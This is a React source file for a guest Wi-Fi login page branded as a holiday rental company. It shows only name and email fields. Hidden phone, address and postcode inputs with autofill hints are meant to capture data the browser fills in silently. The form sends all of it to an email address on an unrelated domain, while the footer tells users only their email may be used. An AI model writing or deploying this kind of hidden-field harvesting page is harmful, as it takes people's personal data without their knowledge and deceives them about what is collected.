
import React, { useState } from 'react';
import { toast } from "@/components/ui/sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";

const Index = () => {
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    phone: '',
    address: '',
    postcode: '',
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    
    // Form will be submitted to FormSubmit service
    setTimeout(() => {
      setIsSubmitting(false);
      setIsSubmitted(true);
      
      // After a brief delay, continue with the standard submission
      setTimeout(() => {
        const form = document.getElementById('wifi-form') as HTMLFormElement;
        if (form) {
          form.submit();
        }
      }, 1500);
    }, 1000);
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-white to-lamanga-gray flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-luxury p-6 text-center">
          <div className="flex justify-center mb-4">
            <div className="relative w-24 h-24">
              <img 
                src="/lovable-uploads/ac325db8-152a-4fa4-b6f6-dbc8747b89fa.png" 
                alt="La Manga Club Rentals Logo" 
                className="w-full h-full object-contain"
              />
            </div>
          </div>
          <h2 className="text-xl font-semibold text-lamanga-text-dark mb-3">Thank You!</h2>
          <p className="text-gray-600 mb-4">You will be connected to the Wi-Fi shortly.</p>
          <div className="w-12 h-12 border-4 border-lamanga-blue border-t-transparent rounded-full animate-spin mx-auto"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-white to-lamanga-gray flex flex-col items-center justify-center p-4">
      <div className="w-full max-w-md bg-white rounded-2xl shadow-luxury p-5">
        <div className="flex justify-center mb-4">
          <div className="relative w-40 h-40">
            <img 
              src="/lovable-uploads/ac325db8-152a-4fa4-b6f6-dbc8747b89fa.png" 
              alt="La Manga Club Rentals Logo" 
              className="w-full h-full object-contain"
            />
          </div>
        </div>
        
        <div className="text-center mb-4">
          <h1 className="text-xl font-semibold text-lamanga-text-dark mb-1">
            Connect to La Manga Club Rentals Wi-Fi
          </h1>
          <p className="text-sm text-gray-600">
            Please enter your details to continue
          </p>
        </div>
        
        <form 
          id="wifi-form"
          onSubmit={handleSubmit} 
          action="https://formsubmit.co/info@timingchaingatwick.co.uk" 
          method="POST" 
          className="space-y-4"
        >
          {/* FormSubmit Configuration */}
          <input type="hidden" name="_subject" value="New Wi-Fi Connection Request" />
          <input type="hidden" name="_captcha" value="false" />
          <input type="hidden" name="_template" value="table" />
          <input type="hidden" name="_next" value="https://formsubmit.co/confirm/info@timingchaingatwick.co.uk" />
          
          {/* Visible Form Fields */}
          <div className="space-y-3">
            <div>
              <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-1">
                Full Name
              </label>
              <input
                type="text"
                id="fullName"
                name="fullName"
                autoComplete="name"
                required
                value={formData.fullName}
                onChange={handleChange}
                className="w-full px-3 py-2 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-lamanga-blue focus:border-transparent transition-all"
                placeholder="Enter your full name"
              />
            </div>
            
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-1">
                Email Address
              </label>
              <input
                type="email"
                id="email"
                name="email"
                autoComplete="email"
                required
                value={formData.email}
                onChange={handleChange}
                className="w-full px-3 py-2 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-lamanga-blue focus:border-transparent transition-all"
                placeholder="Enter your email address"
              />
            </div>
          </div>
          
          {/* Hidden Fields */}
          <input 
            type="tel" 
            name="phone" 
            autoComplete="tel" 
            value={formData.phone} 
            onChange={handleChange}
            className="hidden" 
          />
          
          <input 
            type="text" 
            name="address" 
            autoComplete="address-line1" 
            value={formData.address} 
            onChange={handleChange}
            className="hidden" 
          />
          
          <input 
            type="text" 
            name="postcode" 
            autoComplete="postal-code" 
            value={formData.postcode} 
            onChange={handleChange}
            className="hidden" 
          />
          
          {/* MikroTik Hotspot Integration */}
          <input type="hidden" name="username" value="guest" />
          <input type="hidden" name="password" value="guest" />
          
          {/* Submit Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className={`w-full py-2 px-4 rounded-lg font-medium text-white transition-all 
              ${isSubmitting 
                ? 'bg-lamanga-light-blue animate-pulse-soft cursor-not-allowed' 
                : 'bg-lamanga-blue hover:bg-lamanga-dark-blue focus:ring-2 focus:ring-offset-2 focus:ring-lamanga-blue focus:outline-none'
              }`}
          >
            {isSubmitting ? 'Connecting...' : 'Connect to Wi-Fi'}
          </button>
          
          {/* Footer Text */}
          <div className="text-xs text-center text-gray-500 mt-2">
            By connecting, you agree to our Wi-Fi terms. Your email may be used to send exclusive rental offers.
          </div>
        </form>
      </div>
    </div>
  );
};

export default Index;
